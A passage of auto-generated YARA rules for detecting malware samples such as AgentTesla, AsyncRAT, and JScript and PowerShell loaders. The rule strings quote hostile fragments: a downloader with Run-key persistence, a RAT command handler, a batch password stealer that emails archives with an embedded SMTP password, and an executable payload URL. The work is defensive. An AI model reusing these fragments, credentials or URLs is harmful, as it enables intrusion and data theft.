      $s10 = "2Umlod0dVTi9zeUx3aW5hcW1oMUVMZmE4RnpxODVZL1lkTEs2Zlp0YUUyb2RoM2FnVHZuZHg2ekgyNHE0UjB3YytqRWlqemhDVC95dk5RLytQQmdBYlovQjl6dnlBdGt" ascii /* base64 encoded string 'RihwGUN/syLwinaqmh1ELfa8Fzq85Y/YdLK6fZtaE2odh3agTvndx6zH24q4R0wc+jEijzhCT/yvNQ/+PBgAbZ/B9zvyAtk' */ /* score: '21.00'*/
      $s11 = "DdERmU0VBaHVxR2FvMG95OXdWVU90bHRGbDk2ZnlCQnRVeVVnK1FFY0pEeDA4dW9HM2pvd0VDRE1ZN1d3MWgwcVd0UjdrRE93ZXZpdExwR1RLNHZZSEx6Zlo3cEV6YWJ" ascii /* base64 encoded string 'tDfSEAhuqGao0oy9wVUOtltFl96fyBBtUyUg+QEcJDx08uoG3jowECDMY7Ww1h0qWtR7kDOwevitLpGTK4vYHLzfZ7pEzab' */ /* score: '21.00'*/
      $s12 = "2dTNPTGM4QXBSMzJGS1lMTjF1QVdnNzBPOWlCbGdLMmEwUUJ6S2hjMDNXakZiYjhQdlBvTmc2bmtldEJLaUlZNE5lZG1ldERHQVVXWjRHT0NxcWdvSnBwcFY0eU5WT0Z" ascii /* base64 encoded string 'u3OLc8ApR32FKYLN1uAWg70O9iBlgK2a0QBzKhc03WjFbb8PvPoNg6nketBKiIY4NedmetDGAUWZ4GOCqqgoJpppV4yNVOF' */ /* score: '21.00'*/
      $s13 = "DeEtLb0ZQeWFiQXFXMHBYaWlIT2d1YlgxbERKRHFHYjNZSFBIWWo5c0xMK3NwMUgzRCtVM3h0Tm9objcrcnJUaFdVY1Ywd3A4ZHdVWGgvZHJNTWcyU0VOZWJVSFo0VVl" ascii /* base64 encoded string 'xKKoFPyabAqW0pXiiHOgubX1lDJDqGb3YHPHYj9sLL+sp1H3D+U3xtNohn7+rrThWUcV0wp8dwUXh/drMMg2SENebUHZ4UY' */ /* score: '21.00'*/
      $s14 = "TZVFMTTVNQjlaMXFOK0x6aUd1Vk1QUUdIUEJud0c5SW56bFFpRkhGRzhxUC94dkR3SjFwZXJ5RGpPUGRLdjJUS0FveWxkQ0s1ak1mREkvbUZsVEFuYkI4TFRWRldxWnZ" ascii /* base64 encoded string 'eQLM5MB9Z1qN+LziGuVMPQGHPBnwG9InzlQiFHFG8qP/xvDwJ1peryDjOPdKv2TKAoyldCK5jMfDI/mFlTAnbB8LTVFWqZv' */ /* score: '21.00'*/
      $s15 = "PYVpWNWhhSHVQU0o2Nis1c3hCQklyd3c1YW96a1owU3NRQ0V6MnFvQVNXaUlxWktCQ1oxc21Bamtyc3F5YWtHdEJVQTZWUElqOGFHVU1RbkMwZDhYbFlqMDRhRWkrdnJ" ascii /* base64 encoded string 'aZV5haHuPSJ66+5sxBBIrww5aozkZ0SsQCEz2qoASWiIqZKBCZ1smAjkrsqyakGtBUA6VPIj8aGUMQnC0d8XlYj04aEi+vr' */ /* score: '21.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule sig_9b2ce307f3af58493b83e3c8c2a31794d433fb304ccb9991d7b8979d181baec7_9b2ce307 {
   meta:
      description = "_subset_batch - file 9b2ce307f3af58493b83e3c8c2a31794d433fb304ccb9991d7b8979d181baec7_9b2ce307.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9b2ce307f3af58493b83e3c8c2a31794d433fb304ccb9991d7b8979d181baec7"
   strings:
      $s1 = "eulogizing bookbinding psychiatries porkwood executing narwhale tripodies polyptychs teetotums towboats jogged transferable cont" ascii /* score: '22.00'*/
      $s2 = "    var lhTm9CbqgO9l2ScxO7J0El7T0K6yXb7t0E59RWHxkze4gjxEf8eYe5rrfA8y3OcjdvZE5TBN = GetObject(EEADjncGuns1yvqH52AysAL8jFnTjdIi6vz" ascii /* score: '18.00'*/
      $s3 = "itching outer dasymeter incisively porism craniometries playlets expander kibitzes triples botch temples beheadals agrestic comm" ascii /* score: '18.00'*/
      $s4 = ", 98462, \",\") + WScript.ScriptFullName + \"\\\"\", null, RwOYieNlPiU2e3W0NHX2d7, 0);" fullword ascii /* score: '18.00'*/
      $s5 = "// uniformness uncarded fibbers bulky fractious pithy beauty fogeyish teemingnesses binarism cooperatives huskily defoliant outb" ascii /* score: '17.00'*/
      $s6 = "// switchbacks citronella solecize ameloblasts sinusoid rockslides theologies restrainers cappuccinos glutaraldehydes perinatall" ascii /* score: '17.00'*/
      $s7 = "// unprovable premeiotic trailering copyists deadlined gauming tweezing lostnesses newt superablenesses instructorships mitres u" ascii /* score: '16.00'*/
      $s8 = "y saponifies derm mortarboards gaucheries streetlights cubist congressional zibellines dissimilate scripter spherules shashlik b" ascii /* score: '15.00'*/
      $s9 = "dvZE5TBN.Get(EEADjncGuns1yvqH52AysAL8jFnTjdIi6vzdvwgCGTGn0vEUeTyB573mMmEqI1fGnqUJzljzfF[2][0]([22, 34, 39, 55, 54, 68, 15, 43, 4" ascii /* score: '15.00'*/
      $s10 = "WScript.Sleep(8000);" fullword ascii /* score: '13.00'*/
      $s11 = "dvwgCGTGn0vEUeTyB573mMmEqI1fGnqUJzljzfF[2][0]([48, 34, 39, 38, 32, 38, 45, 44, 66]) + \"\\\\\\\\.\\\\\" + EEADjncGuns1yvqH52AysA" ascii /* score: '13.00'*/
      $s12 = "zsNZ0oM56OfU5DCbHHquZK1vaPK7gqOn3lQKp3cq8LxlpcYip1((Math.floor(Math.random() * (6 - 3 + 1))) + 3, (Math.floor(Math.random() * (1" ascii /* score: '12.00'*/
      $s13 = "// idealogy dashboard elevenses rotisseries middlebrows conceptualizing nonfilamentous recycles rejecters airtight jargonized co" ascii /* score: '12.00'*/
      $s14 = "// idealogy dashboard elevenses rotisseries middlebrows conceptualizing nonfilamentous recycles rejecters airtight jargonized co" ascii /* score: '12.00'*/
      $s15 = "zsNZ0oM56OfU5DCbHHquZK1vaPK7gqOn3lQKp3cq8LxlpcYip1((Math.floor(Math.random() * (6 - 3 + 1))) + 3, (Math.floor(Math.random() * (1" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x2f2f and filesize < 100KB and
      8 of them
}

rule sig_9c1bf9a97439d2f09e5c09c4a377577d753d697f55a341fec7a2cdfc259a1522_9c1bf9a9 {
   meta:
      description = "_subset_batch - file 9c1bf9a97439d2f09e5c09c4a377577d753d697f55a341fec7a2cdfc259a1522_9c1bf9a9.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9c1bf9a97439d2f09e5c09c4a377577d753d697f55a341fec7a2cdfc259a1522"
   strings:
      $s1 = "            Start-Process $vJ3zM -WindowStyle Hidden -ErrorAction SilentlyContinue" fullword ascii /* score: '21.00'*/
      $s2 = "    $pD6jS.Headers.Add(\"User-Agent\",\"PowerShell/5.1\")" fullword ascii /* score: '20.00'*/
      $s3 = "            $aL9kF = Get-ChildItem $zX9pL -Recurse -Name \"*.exe\" -ErrorAction SilentlyContinue | Select-Object -First 1" fullword ascii /* score: '18.00'*/
      $s4 = "            # Process execution" fullword ascii /* score: '15.00'*/
      $s5 = "    $zX9pL = [System.IO.Path]::GetTempPath()" fullword ascii /* score: '14.00'*/
      $s6 = "                New-ItemProperty -Path $iR6xP -Name $nC2hV -Value $dF4sK -PropertyType String -Force -ErrorAction SilentlyContin" ascii /* score: '13.00'*/
      $s7 = "                New-ItemProperty -Path $iR6xP -Name $nC2hV -Value $dF4sK -PropertyType String -Force -ErrorAction SilentlyContin" ascii /* score: '13.00'*/
      $s8 = "            $iR6xP = \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" fullword ascii /* score: '11.00'*/
      $s9 = "            $oW1nQ = New-Object -ComObject Shell.Application" fullword ascii /* score: '10.00'*/
      $s10 = "    $pD6jS = New-Object System.Net.WebClient" fullword ascii /* score: '9.00'*/
      $s11 = "            Add-Type -AssemblyName System.IO.Compression.FileSystem" fullword ascii /* score: '9.00'*/
      $s12 = "            [System.IO.Compression.ZipFile]::ExtractToDirectory($mK4vR, $zX9pL)" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x7274 and filesize < 5KB and
      8 of them
}

rule sig_9daf8030591f80a7f5aaa87eb30692888a3cfad81bb04c058ac288af9e052bb8_9daf8030 {
   meta:
      description = "_subset_batch - file 9daf8030591f80a7f5aaa87eb30692888a3cfad81bb04c058ac288af9e052bb8_9daf8030.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9daf8030591f80a7f5aaa87eb30692888a3cfad81bb04c058ac288af9e052bb8"
   strings:
      $x1 = "                    $psi.Arguments = \"-NoProfile -ExecutionPolicy Bypass -Command $cmd\"" fullword ascii /* score: '36.00'*/
      $x2 = "    $cpu = _safe { (Get-ItemProperty 'HKLM:\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0').ProcessorNameString } ''" fullword ascii /* score: '31.00'*/
      $s3 = "            if ($Command -match \"^EXEC_(CMD|POWERSHELL)\\s+(.+)$\") {" fullword ascii /* score: '21.00'*/
      $s4 = "                    $psi.FileName = \"cmd.exe\"" fullword ascii /* score: '20.00'*/
      $s5 = "$mutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$createdNew)" fullword ascii /* score: '18.00'*/
      $s6 = "     \"Computer: $comp | User: $user | Domain: $domain | IPs: $ip | CPU: $cpu | RAM: ${ramGB}GB | GPU: $gpu | Virtualized: $virt" ascii /* score: '17.00'*/
      $s7 = "| Elevated: $elevated\"" fullword ascii /* score: '16.00'*/
      $s8 = "$mutexName = \"Global\\Sefoxprod4\"" fullword ascii /* score: '15.00'*/
      $s9 = "$AuthPassword = \"certokey0\"" fullword ascii /* score: '15.00'*/
      $s10 = "    $elevated = if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security" ascii /* score: '13.00'*/
      $s11 = "            if ($Command -match \"^UPLOAD (\\S+) (\\d+)$\") {" fullword ascii /* score: '13.00'*/
      $s12 = "    $elevated = if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security" ascii /* score: '13.00'*/
      $s13 = "                    $modulePath = \"$env:TEMP\\$moduleName.exe\"" fullword ascii /* score: '13.00'*/
      $s14 = "                $psi.UseShellExecute = $false" fullword ascii /* score: '13.00'*/
      $s15 = "            if ($Command -eq \"EXIT\") { " fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0xbbef and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule a0c3fa62661159a9eef10b604214afade57a535a405c359b827a3bbd4b0cc63e_a0c3fa62 {
   meta:
      description = "_subset_batch - file a0c3fa62661159a9eef10b604214afade57a535a405c359b827a3bbd4b0cc63e_a0c3fa62.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a0c3fa62661159a9eef10b604214afade57a535a405c359b827a3bbd4b0cc63e"
   strings:
      $x1 = "                    var epithelarian = new Enumerator(thyroxines.ExecQuery(\"Select * from Win32_ComputerSystemProcessor\", null" ascii /* score: '34.00'*/
      $x2 = "                    var epithelarian = new Enumerator(thyroxines.ExecQuery(\"Select * from Win32_ComputerSystemProcessor\", null" ascii /* score: '34.00'*/
      $s3 = "                                console.log(\"    \" + attenuators + \": \" + pad.substr(0, misreported - attenuators.length) + " ascii /* score: '27.00'*/
      $s4 = "                    var epithelarian = new Enumerator(thyroxines.ExecQuery(\"Select * from Win32_Processor\", null, 48));" fullword ascii /* score: '27.00'*/
      $s5 = "                                console.log(\"    \" + attenuators + \": \" + pad.substr(0, misreported - attenuators.length) + " ascii /* score: '27.00'*/
      $s6 = "                    var epithelarian = new Enumerator(thyroxines.ExecQuery(\"Select * from Win32_Process\", null, 48));" fullword ascii /* score: '27.00'*/
      $s7 = "                    var epithelarian = new Enumerator(thyroxines.ExecQuery(\"Select * from Win32_NetworkLoginProfile\", null, 48" ascii /* score: '27.00'*/
      $s8 = "                    var epithelarian = new Enumerator(thyroxines.ExecQuery(\"Select * from Win32_NetworkLoginProfile\", null, 48" ascii /* score: '27.00'*/
      $s9 = "                    var epithelarian = new Enumerator(thyroxines.ExecQuery(\"Select * from Win32_AssociatedProcessorMemory\", nu" ascii /* score: '27.00'*/
      $s10 = "                    var epithelarian = new Enumerator(thyroxines.ExecQuery(\"Select * from Win32_PrinterDriverDll\", null, 48));" ascii /* score: '27.00'*/
      $s11 = "                    var epithelarian = new Enumerator(thyroxines.ExecQuery(\"Select * from Win32_AssociatedProcessorMemory\", nu" ascii /* score: '27.00'*/
      $s12 = "                    var epithelarian = new Enumerator(thyroxines.ExecQuery(\"Select * from Win32_TemperatureProbe\", null, 48));" ascii /* score: '26.00'*/
      $s13 = "                    var epithelarian = new Enumerator(thyroxines.ExecQuery(\"Select * from Win32_SerialPortConfiguration\", null" ascii /* score: '25.00'*/
      $s14 = "                    var epithelarian = new Enumerator(thyroxines.ExecQuery(\"Select * from Win32_SerialPortConfiguration\", null" ascii /* score: '25.00'*/
      $s15 = "                    var epithelarian = new Enumerator(thyroxines.ExecQuery(\"Select * from Win32_HeatPipe\", null, 48));" fullword ascii /* score: '25.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule a3__Logger_signature_ {
   meta:
      description = "_subset_batch - file a3--Logger(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5554ca93846129bc28fdcbfcd24d49ee67a117498bd6bcd99a498c0c48c41288"
   strings:
      $x1 = "                    var tributariness = new Enumerator(Avinesh.ExecQuery(\"Select * from Win32_ComputerSystemProcessor\", null, " ascii /* score: '34.00'*/
      $x2 = "                    var tributariness = new Enumerator(Avinesh.ExecQuery(\"Select * from Win32_ComputerSystemProcessor\", null, " ascii /* score: '34.00'*/
      $s3 = "                    var tributariness = new Enumerator(Avinesh.ExecQuery(\"Select * from Win32_AssociatedProcessorMemory\", null" ascii /* score: '27.00'*/
      $s4 = "                    var tributariness = new Enumerator(Avinesh.ExecQuery(\"Select * from Win32_AssociatedProcessorMemory\", null" ascii /* score: '27.00'*/
      $s5 = "                    var tributariness = new Enumerator(Avinesh.ExecQuery(\"Select * from Win32_PrinterDriverDll\", null, 48));" fullword ascii /* score: '27.00'*/
      $s6 = "                    var tributariness = new Enumerator(Avinesh.ExecQuery(\"Select * from Win32_Processor\", null, 48));" fullword ascii /* score: '27.00'*/
      $s7 = "                    var tributariness = new Enumerator(Avinesh.ExecQuery(\"Select * from Win32_NetworkLoginProfile\", null, 48))" ascii /* score: '27.00'*/
      $s8 = "                    var tributariness = new Enumerator(Avinesh.ExecQuery(\"Select * from Win32_Process\", null, 48));" fullword ascii /* score: '27.00'*/
      $s9 = "                    var tributariness = new Enumerator(Avinesh.ExecQuery(\"Select * from Win32_TemperatureProbe\", null, 48));" fullword ascii /* score: '26.00'*/
      $s10 = "var Hamsun = monaxonal.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s11 = "                    var tributariness = new Enumerator(Avinesh.ExecQuery(\"Select * from Win32_SerialPortConfiguration\", null, " ascii /* score: '25.00'*/
      $s12 = "                    var tributariness = new Enumerator(Avinesh.ExecQuery(\"Select * from Win32_HeatPipe\", null, 48));" fullword ascii /* score: '25.00'*/
      $s13 = "                    var tributariness = new Enumerator(Avinesh.ExecQuery(\"Select * from Win32_SerialPortConfiguration\", null, " ascii /* score: '25.00'*/
      $s14 = "                    var tributariness = new Enumerator(Avinesh.ExecQuery(\"Select * from Win32_OperatingSystem\", null, 48));" fullword ascii /* score: '24.00'*/
      $s15 = "                    var tributariness = new Enumerator(Avinesh.ExecQuery(\"Select * from Win32_NTLogEvent\", null, 48));" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule sig_9b54840b3c52bd6e658d542d0208dc5b6902a1217639cde120e158ff684a5a78_9b54840b {
   meta:
      description = "_subset_batch - file 9b54840b3c52bd6e658d542d0208dc5b6902a1217639cde120e158ff684a5a78_9b54840b.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9b54840b3c52bd6e658d542d0208dc5b6902a1217639cde120e158ff684a5a78"
   strings:
      $x1 = "sendsmtp /HOST out.impresasemplice.it /PORT 25 /USERID admin@comuneorzivecchi.191.it /PASS Logan757. /FROM admin@comuneorzivecch" ascii /* score: '39.00'*/
      $x2 = "Pass.exe /min > c:\\time\\out\\%username%--%computername%--pwd.txt" fullword ascii /* score: '34.00'*/
      $x3 = "sendsmtp /HOST out.impresasemplice.it /PORT 25 /USERID admin@comuneorzivecchi.191.it /PASS Logan757. /FROM admin@comuneorzivecch" ascii /* score: '32.00'*/
      $s4 = "rar.exe a -df -dr c:\\time\\All c:\\time\\out\\*.*" fullword ascii /* score: '24.00'*/
      $s5 = "del /F /S /Q \"c:\\time\\pass.exe\"" fullword ascii /* score: '24.00'*/
      $s6 = "del /F /S /Q \"c:\\time\\down.bat\"" fullword ascii /* score: '21.00'*/
      $s7 = "del /F /S /Q \"c:\\time\\ORDINI.exe\"" fullword ascii /* score: '21.00'*/
      $s8 = "i.191.it /TO admin@comuneorzivecchi.191.it /SUBJECT \"%username%  %computername%\"  /FILES All.rar" fullword ascii /* score: '21.00'*/
      $s9 = "del /F /S /Q \"c:\\time\\HideDown.vbs\"" fullword ascii /* score: '21.00'*/
      $s10 = "ping 1.1.1.1 -n 1 -w 1000 > nul" fullword ascii /* score: '20.00'*/
      $s11 = "ping 1.1.1.1 -n 1 -w 2000 > nul" fullword ascii /* score: '20.00'*/
      $s12 = "ping 1.1.1.1 -n 1 -w 60000 > nul" fullword ascii /* score: '20.00'*/
      $s13 = "ping 1.1.1.1 -n 1 -w 30000 > nul" fullword ascii /* score: '20.00'*/
      $s14 = "del /F /S /Q \"c:\\time\\*.rar\"" fullword ascii /* score: '17.00'*/
      $s15 = "RMDIR /s /q out" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x4345 and filesize < 2KB and
      1 of ($x*) and 4 of them
}

rule sig_9b6f0da37c6c7d9c966b7d700036185c_imphash_ {
   meta:
      description = "_subset_batch - file 9b6f0da37c6c7d9c966b7d700036185c(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f5dfaa1c77a27acee74539e17512a277d0e05358bf9ccce7f59c76bd7fd5551a"
   strings:
      $s1 = "http://84.21.189.158:5554/huier.exe" fullword ascii /* score: '27.00'*/
      $s2 = "C:\\Users\\danar\\OneDrive\\" fullword ascii /* score: '24.00'*/
      $s3 = "dwathgr.exe" fullword ascii /* score: '22.00'*/
      $s4 = "\\Add\\Linkern\\x64\\Release\\Linkern.pdb" fullword ascii /* score: '14.00'*/
      $s5 = ".?AVfilesystem_error@filesystem@std@@" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule AsyncRAT_signature__68a20372ac7d1d0ff27a79b0b7214a4e_imphash_ {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_68a20372ac7d1d0ff27a79b0b7214a4e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cd8a36d4a80f14395a3fc5f76bdc04383afaf8dfbe0b79e743b244cd31808021"
   strings:
      $s1 = "__MAJ_AS_RPE_v00001_EMB.exe" fullword ascii /* score: '16.00'*/
      $s2 = "%s\\AvCorpATsC.exe" fullword ascii /* score: '15.00'*/
      $s3 = "DATA.txt" fullword ascii /* score: '14.00'*/
      $s4 = "STB.txt" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule b2c81b106d11ae81264a5fbcab0aae8b_imphash_ {
   meta:
      description = "_subset_batch - file b2c81b106d11ae81264a5fbcab0aae8b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fc8197adf50313fa8d889ded2ed96600a9d946caa01448d21b207bfe94ccff0e"
   strings:
      $s1 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s2 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s3 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
      $s4 = "vyfffff" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule sig_9b962e5ef7f54c33070c89d10c14c43b6285d3f5f9ba5c1d654973245f04ee82_9b962e5e {
   meta:
      description = "_subset_batch - file 9b962e5ef7f54c33070c89d10c14c43b6285d3f5f9ba5c1d654973245f04ee82_9b962e5e.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9b962e5ef7f54c33070c89d10c14c43b6285d3f5f9ba5c1d654973245f04ee82"
   strings:
      $s1 = "* {M]?" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4ebb and filesize < 5000KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__517f289e {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_517f289e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "517f289ea24bf5a5270a83308aff7b392fcd572daea4448978ef7001d53b4a73"
   strings:
      $s1 = "yyWJ.exe" fullword wide /* score: '22.00'*/
      $s2 = "yyWJ.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "products.txt" fullword wide /* score: '14.00'*/
      $s4 = "listings.txt" fullword wide /* score: '14.00'*/
      $s5 = "results.txt" fullword wide /* score: '14.00'*/
      $s6 = "rotavitcA.metsyS" fullword wide /* reversed goodware string 'System.Activator' */ /* score: '13.00'*/
      $s7 = ".NET Framework 4.5*" fullword ascii /* score: '10.00'*/
      $s8 = "get_DateAnnounced" fullword ascii /* score: '9.00'*/
      $s9 = "get_Tokens" fullword ascii /* score: '9.00'*/
      $s10 = "get_Listings" fullword ascii /* score: '9.00'*/
      $s11 = "get_Currency" fullword ascii /* score: '9.00'*/
      $s12 = "WSFe!." fullword ascii /* score: '8.00'*/
      $s13 = "racketa" fullword wide /* score: '8.00'*/
      $s14 = "listings" fullword wide /* score: '8.00'*/
      $s15 = "scoretext" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule AteraAgent_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file AteraAgent(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "db8238e6b2d089bb052a7e70df59d86ab8833f19f63142ab42caa35724597fc3"
   strings:
      $x1 = "AteraNLogger.exe" fullword wide /* score: '32.00'*/
      $s2 = "AlphaControlCommandPerformerRunPackage.Perform(): performLogParams.ShouldDownload is true: " fullword wide /* score: '29.00'*/
      $s3 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii /* score: '27.00'*/
      $s4 = "AteraAgent.exe" fullword wide /* score: '27.00'*/
      $s5 = "ShouldPostCommandExecutionErrorToCloud" fullword ascii /* score: '27.00'*/
      $s6 = "AlphaAgent.exe" fullword wide /* score: '27.00'*/
      $s7 = "AteraNLogger.exe.config" fullword wide /* score: '27.00'*/
      $s8 = "AteraAgentWD.exe" fullword wide /* score: '27.00'*/
      $s9 = "Dism.exe /Online /Get-FeatureInfo /FeatureName:NetFx3 | FIND \"State\" | find \"Disable\" && Dism.exe /Online /Enable-Feature /F" wide /* score: '26.00'*/
      $s10 = "Failed to run unins000.exe" fullword wide /* score: '25.00'*/
      $s11 = "packageExecutableCommandArgs" fullword ascii /* score: '24.00'*/
      $s12 = "D:\\a\\1\\s\\AlphaControlAgent\\obj\\Release\\AteraAgent.pdb" fullword ascii /* score: '24.00'*/
      $s13 = "IsCommandEligibleForExecution" fullword ascii /* score: '24.00'*/
      $s14 = "<IsCommandEligibleForExecution>b__73_0" fullword ascii /* score: '24.00'*/
      $s15 = "commandExecutionTimeoutInSeconds" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__40e8a879 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_40e8a879.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "40e8a8796f4d79ba15a3b618c0bbd527db49674819b1e30791d2b704a684c756"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD^V" fullword ascii /* score: '27.00'*/
      $s2 = "izg.exe" fullword wide /* score: '19.00'*/
      $s3 = "!!!5!!!5!!!" fullword ascii /* score: '18.00'*/ /* hex encoded string 'U' */
      $s4 = "https://www.facebook.com/mohammed.telkhoukhe" fullword wide /* score: '17.00'*/
      $s5 = "https://www.instagram.com/m.tel18/" fullword wide /* score: '17.00'*/
      $s6 = "https://www.linkedin.com/in/mohamed-telkhoukhe-419019246/" fullword wide /* score: '17.00'*/
      $s7 = "logoPictureBox.Image" fullword wide /* score: '12.00'*/
      $s8 = "get_AssemblyDescription" fullword ascii /* score: '11.00'*/
      $s9 = "izg.pdb" fullword ascii /* score: '11.00'*/
      $s10 = "!!!E!!!" fullword ascii /* score: '10.00'*/
      $s11 = "!!!q!!!" fullword ascii /* score: '10.00'*/
      $s12 = "!!!#!!!" fullword ascii /* score: '10.00'*/
      $s13 = "!!!%!!!" fullword ascii /* score: '10.00'*/
      $s14 = "!!!A!!!" fullword ascii /* score: '10.00'*/
      $s15 = "!!!O!!!" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule AgentTesla_signature__ea396704 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_ea396704.tar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ea3967049afe19081ffe2e85722cec8ab9670630b0733c15ad552771109f2537"
   strings:
      $s1 = "Lsioifq.exe" fullword wide /* score: '22.00'*/
      $s2 = "PO15000989 preparation.exe" fullword ascii /* score: '19.00'*/
      $s3 = "ELsioifq, Version=1.0.6780.19130, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s4 = "Unsupported hash size." fullword wide /* score: '10.00'*/
      $s5 = ",,,:!!!" fullword ascii /* score: '10.00'*/
      $s6 = "ComputeDerivedKey" fullword ascii /* score: '10.00'*/
      $s7 = "777S!!!" fullword ascii /* score: '10.00'*/
      $s8 = "getBuffer" fullword wide /* score: '9.00'*/
      $s9 = "GetEffectivePbkdf2Salt" fullword ascii /* score: '9.00'*/
      $s10 = "_getBuffer" fullword ascii /* score: '9.00'*/
      $s11 = "get_Rnorrjimu" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4f50 and filesize < 4000KB and
      8 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2b3b53a5 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2b3b53a5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2b3b53a5156b258cbe1babe783c03f3b3733c1b51a45fc6b23d84f4a84b50b84"
   strings:
      $s1 = "Xkidhrwspv.exe" fullword wide /* score: '22.00'*/
      $s2 = "HXkidhrwspv, Version=1.0.8745.20097, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s3 = "KE5AOHRiD" fullword wide /* base64 encoded string '(N@8tb' */ /* score: '11.00'*/
      $s4 = "Unsupported hash size." fullword wide /* score: '10.00'*/
      $s5 = "ComputeDerivedKey" fullword ascii /* score: '10.00'*/
      $s6 = "getBuffer" fullword wide /* score: '9.00'*/
      $s7 = "GetEffectivePbkdf2Salt" fullword ascii /* score: '9.00'*/
      $s8 = "_getBuffer" fullword ascii /* score: '9.00'*/
      $s9 = "get_Xpodyotnyz" fullword ascii /* score: '9.00'*/
      $s10 = "%MZCf%d}" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4b493efb {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4b493efb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b493efbc51d8cc77f3fe9e2b96070d5b9e1641a00a3f265cdb60209993fa515"
   strings:
      $s1 = "Fsrqyz.exe" fullword wide /* score: '22.00'*/
      $s2 = "DFsrqyz, Version=1.0.7666.24805, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s3 = "Unsupported hash size." fullword wide /* score: '10.00'*/
      $s4 = "ComputeDerivedKey" fullword ascii /* score: '10.00'*/
      $s5 = "FIVnj:\\" fullword ascii /* score: '10.00'*/
      $s6 = "getBuffer" fullword wide /* score: '9.00'*/
      $s7 = "GetEffectivePbkdf2Salt" fullword ascii /* score: '9.00'*/
